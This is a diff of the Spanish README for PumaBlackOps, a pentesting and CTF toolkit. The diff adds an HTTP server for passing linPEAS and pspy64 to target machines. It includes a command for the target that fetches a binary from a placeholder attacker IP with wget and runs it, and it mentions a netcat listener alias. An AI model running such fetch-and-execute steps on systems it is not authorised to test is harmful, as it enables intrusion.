@@ -1,14 +1,16 @@
 # PumaBlackOps
 
-**PumaBlackOps** es un conjunto de herramientas y scripts Bash para facilitar la gestión de objetivos, automatización de tareas y utilidades comunes en pentesting y CTFs, ahora con integración avanzada de tmux, flujos automáticos para CTF, autocompletado inteligente y rutas dinámicas.
+**PumaBlackOps** es un conjunto de herramientas y scripts Bash para facilitar la gestión de objetivos, automatización de tareas y utilidades comunes en pentesting y CTFs, ahora con integración avanzada de tmux, flujos automáticos para CTF, autocompletado inteligente, rutas dinámicas y un servidor HTTP para herramientas de pentesting.
 
 ## 🚀 Quickstart
 
 ```bash
-# 0. Instalar dependencias, esto depende de tu distro
+# 0. Instalar dependencias. -ESTO DEPENDE DE TU DISTRO, pero si usas Kali o alguna otra distro con apt:
+sudo apt update
+sudo apt install tmux ffuf nmap seclists jq xclip direnv
 
 # 1. Clonar e inicializar
-git clone <repo_url> && cd PumaBlackOps
+git clone https://github.com/IsaacNietoG/PumaBlackOps && cd PumaBlackOps
 git submodule update --init --recursive
 
 # 2.1 Agregar la suite a tu PATH:
@@ -26,6 +28,9 @@ target add vulnbox 192.168.1.100
 target scan all
 target dirsearch 8080
 target note "Encontrado panel admin en /admin"
+
+# 5. (Opcional) Iniciar servidor HTTP para herramientas
+assaultRepository start
 ```
 
 **Características principales:**
@@ -35,23 +40,34 @@ target note "Encontrado panel admin en /admin"
 - ✅ **Escaneos automatizados** (nmap, ffuf, dirsearch)
 - ✅ **Timer CTF visual** y macros para extracción de flags
 - ✅ **Rutas dinámicas** - funciona desde cualquier ubicación
+- ✅ **Servidor HTTP para herramientas** - compartir herramientas de pentesting fácilmente
+- ✅ **Gestión de aliases** - carga automática de alias útiles
 
 ## Estructura del repositorio
 
 ```
 .
 ├── aliases/
+│   ├── all.sh
 │   └── general.sh
+├── assaultrepository/
+│   └── (herramientas de pentesting compartidas)
 ├── bin/
 │   ├── target
+│   ├── assaultRepository
 │   ├── ctflinpeas
 │   └── penelope
 ├── lib/
-│   └── tmux_helpers.sh
+│   ├── tmux_helpers.sh
+│   ├── generate-tmux-config.sh
+│   ├── port_scan_browser.py
+│   └── tmux-config.template
 ├── spells/
 │   ├── add-bin-to-path.sh
 │   ├── peass-ng.sh
 │   ├── penelope.sh
+│   ├── pspy64.sh
+│   ├── source-aliases.sh
 │   └── install-completion.sh
 ├── completions/
 │   ├── target.bash
@@ -77,20 +93,30 @@ target note "Encontrado panel admin en /admin"
 Contiene herramientas principales y utilidades ejecutables:
 
 - **target**: Script Bash principal para la gestión de workspaces de pentesting. Ahora automatiza la creación de sesiones tmux, paneles y flujos de trabajo para CTF.
-- **ctflinpeas**: Binario generado por el script `spells/peass-ng.sh`, versión personalizada de linPEAS para enumeración de privilegios en Linux.
+- **assaultRepository**: **NUEVO** - Servidor HTTP para compartir herramientas de pentesting. Permite iniciar/detener un servidor HTTP que sirve archivos desde el directorio `assaultrepository/`, ideal para transferir herramientas a máquinas objetivo.
 - **penelope**: Script Python descargado por `spells/penelope.sh`, herramienta para automatizar tareas de post-explotación y manejo de shells.
 
+### `assaultrepository/`
+**NUEVO** - Directorio que contiene herramientas de pentesting compartidas a través del servidor HTTP. Las herramientas se pueden agregar usando `assaultRepository add` y se sirven automáticamente cuando se inicia el servidor.
+- **ctflinpeas**: Binario generado por el script `spells/peass-ng.sh`, versión personalizada de linPEAS para enumeración de privilegios en Linux.
+- **pspy64**: Binario generado por el script `spells/pspy64.sh`, es una herramienta para inspeccionar procesos en ejecución en sistemas linux sin permisos de root.
+
 ### `lib/`
-Scripts de ayuda:
+Scripts auxiliares para funcionalidades:
 
 - **tmux_helpers.sh**: Funciones Bash para manipular títulos de paneles/ventanas y obtener información de tmux, usadas por el script `target` para integración avanzada.
+- **generate-tmux-config.sh**: **NUEVO** - Script para generar configuraciones de tmux dinámicamente. Es utilizado por `target` para invocar las sesiones de tmux
+- **port_scan_browser.py**: **NUEVO** - Script Python para navegar por resultados de escaneo de puertos. Es utilizado por `target` para el comando target scan ports -s
+- **tmux-config.template**: **NUEVO** - Plantilla para configuraciones de tmux.
 
 ### `spells/`
 Scripts Bash para instalar, configurar o facilitar el uso de herramientas, nacen por la necesidad de automatizar varias tareas y además tener acceso a las ultimas versiones de las herramientas:
 
 - **add-bin-to-path.sh**: Script interactivo para agregar el directorio `bin/` al PATH del usuario de varias formas (temporal, permanente, subshell, symlinks).
-- **peass-ng.sh**: Descarga, compila y coloca una versión personalizada de linPEAS en `bin/ctflinpeas`.
+- **peass-ng.sh**: Descarga, compila y coloca una versión personalizada de linPEAS en `assaultrepository/ctflinpeas`.
 - **penelope.sh**: Descarga y coloca la herramienta penelope en `bin/penelope`.
+- **pspy64.sh**: **NUEVO** - Descarga la última versión de pspy64 desde GitHub y la coloca en `assaultrepository/pspy64`. pspy64 es una herramienta para monitorear procesos en sistemas Linux sin privilegios de root.
+- **source-aliases.sh**: **NUEVO** - Script interactivo para cargar los aliases del proyecto de diferentes formas (temporal, permanente, subshell).
 - **install-completion.sh**: Instala automáticamente el autocompletado bash para la herramienta `target`.
 
 ### `completions/`
@@ -103,6 +129,7 @@ Scripts de autocompletado para mejorar la experiencia de usuario:
 Alias útiles para pentesting y manejo de shells:
 
 - **general.sh**: Define alias como `httpserver` (servidor HTTP rápido con Python) y `listen` (listener con netcat). Se recomienda añadirlo al `.bashrc` o `.zshrc`.
+- **all.sh**: **NUEVO** - Script que carga automáticamente todos los archivos `.sh` en el directorio de aliases (excepto a sí mismo). Útil para cargar todos los aliases del proyecto de una vez.
 
 ### `.config/tmux/`
 Configuración avanzada de tmux para flujos de CTF:
@@ -115,7 +142,9 @@ Directorio reservado para código fuente adicional o scripts personalizados.
 
 ---
 
-## Uso rápido de la herramienta principal: `target`
+## Uso rápido de las herramientas principales
+
+### `target` - Gestión de workspaces
 
 El script `bin/target` permite gestionar workspaces de pentesting de forma sencilla y ahora automatiza la creación de entornos tmux listos para CTF. **Nueva característica**: Incluye autocompletado inteligente con sugerencias contextuales. Sus subcomandos principales son:
 
@@ -157,6 +186,44 @@ target info <TAB>               # Lista targets existentes
 target dirsearch target1 <TAB>  # Sugiere puertos comunes
 ```
 
+### `assaultRepository` - Servidor HTTP para herramientas
+
+**NUEVO** - El script `bin/assaultRepository` proporciona un servidor HTTP para compartir herramientas de pentesting fácilmente. Es ideal para transferir herramientas a máquinas objetivo durante pentests.
+
+**Subcomandos disponibles:**
+- `start [puerto]`: Inicia el servidor HTTP (puerto por defecto: 8000)
+- `stop`: Detiene el servidor HTTP
+- `status`: Muestra el estado del servidor y estadísticas
+- `add <nombre_herramienta> <ruta_archivo>`: Agrega una herramienta al repositorio
+- `list`: Lista todas las herramientas disponibles en el repositorio
+- `help`: Muestra la ayuda
+
+**Ejemplo de uso:**
+```bash
+# Iniciar servidor en puerto 8000
+assaultRepository start
+
+# Agregar herramienta pspy64 al repositorio
+assaultRepository add pspy64 /ruta/a/pspy64
+
+# Ver herramientas disponibles
+assaultRepository list
+
+# Ver estado del servidor
+assaultRepository status
+
+# Detener servidor
+assaultRepository stop
+```
+
+**Acceso desde máquina objetivo:**
+```bash
+# Descargar herramienta desde la máquina objetivo
+wget http://IP_ATACANTE:8000/pspy64
+chmod +x pspy64
+./pspy64
+```
+
 ---
 
 ## Integración avanzada con tmux y plugins
@@ -181,43 +248,6 @@ target dirsearch target1 <TAB>  # Sugiere puertos comunes
 
 ---
 
-## Instalación y configuración
-
-1. Clona el repositorio y entra en la carpeta:
-   ```bash
-   git clone <repo_url>
-   cd PumaBlackOps
-   ```
-
-2. Inicializa los submódulos de plugins de tmux:
-   ```bash
-   git submodule update --init --recursive
-   ```
-
-3. (Opcional) Ejecuta el script para agregar los binarios al PATH:
-   ```bash
-   ./spells/add-bin-to-path.sh
-   ```
-
-4. (Opcional) Instala el autocompletado bash para una mejor experiencia de usuario:
-   ```bash
-   ./spells/install-completion.sh
-   ```
-
-5. (Opcional) Fuentea los alias en tu shell:
-   ```bash
-   echo 'source /ruta/a/PumaBlackOps/aliases/general.sh' >> ~/.bashrc
-   source ~/.bashrc
-   ```
-
-6. Instala direnv para manejo automático de variables de entorno por workspace.
-
-7. Usa los scripts desde cualquier lugar si tienes el PATH configurado.
-
-8. Para aprovechar la integración tmux, asegúrate de tener tmux instalado. **Nota**: El archivo de configuración tmux se carga automáticamente con rutas dinámicas, por lo que no es necesario copiarlo manualmente.
-
----
-
 ## Requisitos
 
 - Bash
@@ -227,10 +257,11 @@ target dirsearch target1 <TAB>  # Sugiere puertos comunes
   - tmux-resurrect
   - tmux-yank
   - dracula/tmux
-- Python 3 (para penelope y httpserver)
+- Python 3 (para penelope, httpserver y assaultRepository)
 - ffuf (para dirsearch)
 - nmap (para escaneo)
-- git, wget (para spells)
+- git, wget, curl (para spells)
+- jq (opcional, para mejor parsing JSON en spells)
 - SecLists en `/usr/share/seclists` (para dirsearch)
 - xclip (para integración de clipboard en tmux)
 - direnv (para manejo automático de variables de entorno por workspace)
@@ -239,6 +270,7 @@ target dirsearch target1 <TAB>  # Sugiere puertos comunes
 
 - Personalizar los atajos de tmux en `.config/tmux/tmux.conf` según tus preferencias.
 - Usar una terminal compatible con mouse y UTF-8 para aprovechar todos los features visuales.
+- Configurar el servidor HTTP assaultRepository para transferir herramientas durante pentests.
 
 ---
 
@@ -246,6 +278,7 @@ target dirsearch target1 <TAB>  # Sugiere puertos comunes
 
 - linPEAS/PEASS-ng: https://github.com/carlospolop/PEASS-ng
 - penelope: https://github.com/brightio/penelope
+- pspy64: https://github.com/DominicBreuker/pspy
 - SecLists: https://github.com/danielmiessler/SecLists
 - tmux-plugins/tpm: https://github.com/tmux-plugins/tpm
 - tmux-plugins/tmux-sensible: https://github.com/tmux-plugins/tmux-sensible
